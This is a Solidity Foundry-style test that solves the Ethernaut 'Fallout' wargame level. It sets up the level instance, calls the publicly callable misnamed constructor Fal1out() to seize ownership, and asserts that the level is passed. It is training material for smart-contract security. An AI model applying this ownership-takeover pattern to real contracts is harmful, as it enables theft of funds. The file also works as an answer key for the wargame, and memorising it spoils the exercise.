// SPDX-License-Identifier: MIT
pragma solidity ^0.6.0;

import {DSEthernautTest} from "./utils/DSEthernautTest.sol";
import {FalloutFactory} from "../src/factories/FalloutFactory.sol";
import {Fallout} from "../src/levels/Fallout.sol";

contract FalloutTest is DSEthernautTest {
    function setUpLevel() public override {
	FalloutFactory factory = new FalloutFactory();
	ethernaut.registerLevel(factory);
	levelAddress = ethernaut.createLevelInstance(factory);
    }

    function testSolveFallout() public {
	Fallout instance = Fallout(payable(levelAddress));
	instance.Fal1out();
	assert(ethernaut.submitLevelInstance(payable(levelAddress)));
    }
}
